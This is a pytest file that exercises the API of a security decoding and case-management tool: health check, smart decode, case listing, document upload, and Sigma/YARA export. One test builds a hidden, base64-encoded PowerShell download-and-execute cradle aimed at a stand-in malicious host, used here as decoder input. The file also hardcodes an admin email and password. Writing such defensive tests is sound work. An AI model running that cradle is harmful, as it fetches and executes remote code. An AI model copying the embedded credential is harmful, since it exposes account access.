"""RC4.1 360° confidence test — flows added on top of test_rc42_smart_decode_flows.py.

Covers the review-request items not already exercised by rc42:
  - GET /api/health
  - POST /api/decode/smart with PowerShell -EncodedCommand (base64 layer + URL)
  - GET /api/cases
  - POST /api/documents/upload
  - GET /api/cases/{id}/sigma  (or 404 tolerated)
  - GET /api/cases/{id}/yara   (or 404 tolerated)
"""
import base64
import io
import os

import pytest
import requests

API_URL = os.environ.get("RC42_API_URL", "http://localhost:8001")
EMAIL = "admin@nivxray.com"
PWD = "uulVDp5cCSB3Hva99s7UUAwK"


@pytest.fixture(scope="session")
def token():
    r = requests.post(f"{API_URL}/api/auth/login",
                      json={"email": EMAIL, "password": PWD}, timeout=15)
    assert r.status_code == 200, f"login failed: {r.status_code} {r.text[:200]}"
    tok = r.json().get("access_token")
    assert tok, "no access_token"
    return tok


def _hdr(token):
    return {"Authorization": f"Bearer {token}"}


# ---- Flow: /api/health ----
def test_health_ok():
    r = requests.get(f"{API_URL}/api/health", timeout=10)
    assert r.status_code == 200, f"health {r.status_code}: {r.text[:200]}"
    body = r.json()
    status = str(body.get("status") or body.get("ok") or "").lower()
    assert status in ("ok", "true", "healthy") or body.get("ok") is True, f"body={body}"


# ---- Flow: EncodedCommand ----
def test_encoded_command_base64_decodes_url(token):
    inner = 'IEX (New-Object Net.WebClient).DownloadString("http://malicious.example.com/x")'
    # PowerShell -EncodedCommand uses UTF-16LE base64
    b64 = base64.b64encode(inner.encode("utf-16le")).decode("ascii")
    payload = f"powershell -NoP -W Hidden -EncodedCommand {b64}"
    r = requests.post(f"{API_URL}/api/decode/smart",
                      headers={**_hdr(token), "Content-Type": "application/json"},
                      json={"input": payload}, timeout=60)
    assert r.status_code == 200, f"HTTP {r.status_code}: {r.text[:300]}"
    js = r.json()
    recipe = js.get("recipe") or []
    ops = []
    for step in recipe:
        if isinstance(step, dict):
            ops.append((step.get("op") or step.get("name") or "").lower())
        else:
            ops.append(str(step).lower())
    for k in ("chain", "chain_analysis", "chain_analyzer", "stages"):
        v = js.get(k) or []
        if isinstance(v, list):
            for st in v:
                if isinstance(st, dict):
                    ops.append((st.get("op") or st.get("name") or st.get("stage") or "").lower())
    assert any("base64" in o for o in ops), f"base64 op missing; ops={ops}"
    out = (js.get("output_raw") or "") + " " + str(js.get("output") or "")
    assert "malicious.example.com" in out, f"URL not decoded; output={out[:400]!r}"


# ---- Flow: /api/cases ----
def test_list_cases(token):
    r = requests.get(f"{API_URL}/api/cases", headers=_hdr(token), timeout=15)
    assert r.status_code == 200, f"HTTP {r.status_code}: {r.text[:200]}"
    body = r.json()
    # Accept list or {items:[...]}
    assert isinstance(body, (list, dict)), f"unexpected type: {type(body)}"


# ---- Flow: /api/documents/upload ----
def test_document_upload(token):
    content = b"TEST_nivxray_upload sample document content"
    files = {"file": ("TEST_upload.txt", io.BytesIO(content), "text/plain")}
    r = requests.post(f"{API_URL}/api/documents/upload",
                      headers=_hdr(token), files=files, timeout=30)
    assert r.status_code in (200, 201), f"HTTP {r.status_code}: {r.text[:300]}"


# ---- Flow: sigma/yara export ----
def _first_case_id(token):
    r = requests.get(f"{API_URL}/api/cases", headers=_hdr(token), timeout=15)
    if r.status_code != 200:
        return None
    b = r.json()
    items = b if isinstance(b, list) else (b.get("items") or b.get("cases") or [])
    if not items:
        return None
    first = items[0]
    if isinstance(first, dict):
        return first.get("id") or first.get("_id") or first.get("case_id")
    return None


def test_case_sigma_export(token):
    cid = _first_case_id(token)
    if not cid:
        pytest.skip("no cases available")
    r = requests.get(f"{API_URL}/api/cases/{cid}/sigma", headers=_hdr(token), timeout=20)
    assert r.status_code in (200, 404), f"HTTP {r.status_code}: {r.text[:200]}"
    if r.status_code == 200:
        text = r.text
        assert "title:" in text.lower() or "detection:" in text.lower() or len(text) > 20, \
            f"sigma content looks wrong: {text[:200]!r}"


def test_case_yara_export(token):
    cid = _first_case_id(token)
    if not cid:
        pytest.skip("no cases available")
    r = requests.get(f"{API_URL}/api/cases/{cid}/yara", headers=_hdr(token), timeout=20)
    assert r.status_code in (200, 404), f"HTTP {r.status_code}: {r.text[:200]}"
    if r.status_code == 200:
        text = r.text
        assert "rule " in text or "{" in text, f"yara content looks wrong: {text[:200]!r}"
